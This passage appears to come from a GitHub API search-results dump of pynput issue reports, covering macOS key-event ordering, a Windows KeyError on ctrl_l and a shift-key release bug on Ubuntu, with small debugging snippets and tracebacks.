print('press',key.__dict__)\r\n    sleep(3)\r\n\r\ndef on_release(key):\r\n    print('release',key.__dict__)\r\n\r\nwith Listener(on_press=on_press,on_release=on_release) as listener:\r\n    listener.join()\r\n```\r\n\r\nThen I type 'V', so that press `shift` then `v` then release `v` then release `shift`. After all output finished, press any other key, for example `x`, then:\r\n```\r\npress {'_value_': <56>, '_name_': 'shift', '__objclass__': <enum 'Key'>}\r\npress {'vk': 9, 'char': 'V', 'is_dead': False, 'combining': None}\r\nrelease {'vk': 9, 'char': 'V', 'is_dead': False, 'combining': None}\r\nrelease {'_value_': <56>, '_name_': 'shift', '__objclass__': <enum 'Key'>}\r\nrelease {'vk': 0, 'char': None, 'is_dead': False, 'combining': None}\r\nrelease {'vk': 7, 'char': 'x', 'is_dead': False, 'combining': None}\r\n```\r\nGIF:\r\n[https://drive.google.com/file/d/1o6OkAfH3Jym5pvKmjvzxmOUba7nLLGKV/view?usp=sharing](url)\r\n\r\n### Other Information:\r\nPython version:\r\n```\r\nPython 3.7.2 (v3.7.2:9a3ffc0492, Dec 24 2018, 02:44:43) \r\n[Clang 6.0 (clang-600.0.57)] on darwin\r\n```\r\npynput install information:\r\n```\r\nCollecting pynput\r\n  Using cached https://files.pythonhosted.org/packages/94/92/9e83e382f808b57330bed06855489242b77c262406aeca4960a16c8666d9/pynput-1.4.2-py2.py3-none-any.whl\r\nRequirement already satisfied: pyobjc-framework-Quartz>=3.0; sys_platform == \"darwin\" in /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from pynput) (5.2)\r\nRequirement already satisfied: six in /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from pynput) (1.12.0)\r\nRequirement already satisfied: pyobjc-core>=5.2 in /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from pyobjc-framework-Quartz>=3.0; sys_platform == \"darwin\"->pynput) (5.2)\r\nRequirement already satisfied: pyobjc-framework-Cocoa>=5.2 in /Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages (from pyobjc-framework-Quartz>=3.0; sys_platform == \"darwin\"->pynput) (5.2)\r\nInstalling collected packages: pynput\r\nSuccessfully installed pynput-1.4.2\r\n```\r\nSystem:\r\n```\r\nmacOS Mojave Version 10.14.4\r\nMacBook Pro (Retina, 13-inch, Early 2015)\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/155", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/155/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/155/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/155/events", "html_url": "https://github.com/moses-palmer/pynput/issues/155", "id": 437697752, "node_id": "MDU6SXNzdWU0Mzc2OTc3NTI=", "number": 155, "title": "KeyError: <Key.ctrl_l: <162>> on windows", "user": {"login": "xiebruce", "id": 13575500, "node_id": "MDQ6VXNlcjEzNTc1NTAw", "avatar_url": "https://avatars0.githubusercontent.com/u/13575500?v=4", "gravatar_id": "", "url": "https://api.github.com/users/xiebruce", "html_url": "https://github.com/xiebruce", "followers_url": "https://api.github.com/users/xiebruce/followers", "following_url": "https://api.github.com/users/xiebruce/following{/other_user}", "gists_url": "https://api.github.com/users/xiebruce/gists{/gist_id}", "starred_url": "https://api.github.com/users/xiebruce/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/xiebruce/subscriptions", "organizations_url": "https://api.github.com/users/xiebruce/orgs", "repos_url": "https://api.github.com/users/xiebruce/repos", "events_url": "https://api.github.com/users/xiebruce/events{/privacy}", "received_events_url": "https://api.github.com/users/xiebruce/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-04-26T14:22:59Z", "updated_at": "2019-11-29T17:01:01Z", "closed_at": "2019-11-29T17:01:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "OS\uff1a`Windows 10` inside Parallels Desktop `14.1.2`\uff0cThe host OS is macOS Mojave `10.14.4`, keyboard is Mac build in keyboard.\r\nPython: `3.7.2`\r\nPynput: `1.4.2`\r\n\r\nI set the key combination to `ctrl_l+shift+u`, when I press  `ctrl_l+shift+u`, it works fine, but when I press `option(alt)+shfit+u`(which I didn't set it as  key combination), it throw an error(but normal in win7):\r\n```\r\n2019-04-26 22:08:54,945: Unhandled exception in listener callback\r\nTraceback (most recent call last):\r\n  File \"C:\\Users\\bruce\\AppData\\Local\\Programs\\Python\\Python37\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 157, in inner\r\n    return f(self, *args, **kwargs)\r\n  File \"C:\\Users\\bruce\\AppData\\Local\\Programs\\Python\\Python37\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 243, in _process\r\n    self.on_release(key)\r\n  File \"C:\\Users\\bruce\\AppData\\Local\\Programs\\Python\\Python37\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 78, in inner\r\n    if f(*args) is False:\r\n  File \"D:\\phpStudy\\PHPTutorial\\WWW\\PicUploader\\accessorys\\PicUploaderHelper\\PicUploaderHelper.pyw\", line 187, in on_release\r\n    current.remove(key)\r\nKeyError: <Key.ctrl_l: <162>>\r\n```\r\n\r\nand another weird action is that after I press the key combination `ctrl_l+shift+u`, then I press `ctrl_l+shift`(without `u`), it acts just like I'm pressing `ctrl_l+shift+u`, I think it's a bug.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/154", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/154/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/154/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/154/events", "html_url": "https://github.com/moses-palmer/pynput/issues/154", "id": 437217017, "node_id": "MDU6SXNzdWU0MzcyMTcwMTc=", "number": 154, "title": "Key.shift returns as a number in on_release()", "user": {"login": "omarcartera", "id": 13907828, "node_id": "MDQ6VXNlcjEzOTA3ODI4", "avatar_url": "https://avatars0.githubusercontent.com/u/13907828?v=4", "gravatar_id": "", "url": "https://api.github.com/users/omarcartera", "html_url": "https://github.com/omarcartera", "followers_url": "https://api.github.com/users/omarcartera/followers", "following_url": "https://api.github.com/users/omarcartera/following{/other_user}", "gists_url": "https://api.github.com/users/omarcartera/gists{/gist_id}", "starred_url": "https://api.github.com/users/omarcartera/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/omarcartera/subscriptions", "organizations_url": "https://api.github.com/users/omarcartera/orgs", "repos_url": "https://api.github.com/users/omarcartera/repos", "events_url": "https://api.github.com/users/omarcartera/events{/privacy}", "received_events_url": "https://api.github.com/users/omarcartera/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-04-25T14:01:47Z", "updated_at": "2019-07-20T19:34:47Z", "closed_at": "2019-07-20T19:34:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "When I press any button, both functions print the button name.\r\n\r\nBUT\r\n\r\nStarting from earlier this week, the function `on_relase()` prints <65032> instead of Key.shift, but behaves normally with all the other buttons. The print function in `on_press()` still works properly.\r\n\r\n```\r\ndef listener_fn():\r\n    with keyboard.Listener(on_press, on_release) as listener:\r\n    listener.join()\r\n\r\ndef on_press(key):\r\n    # this prints (Key.shift)\r\n    print('ADD: ', key)\r\n\r\n\r\ndef on_release(key):\r\n    # this prints <65032>\r\n    print('REM: ', str(key))\r\n```\r\n\r\nUbuntu 19.04", "performed_via_github_app": null, "score": 1.0}]}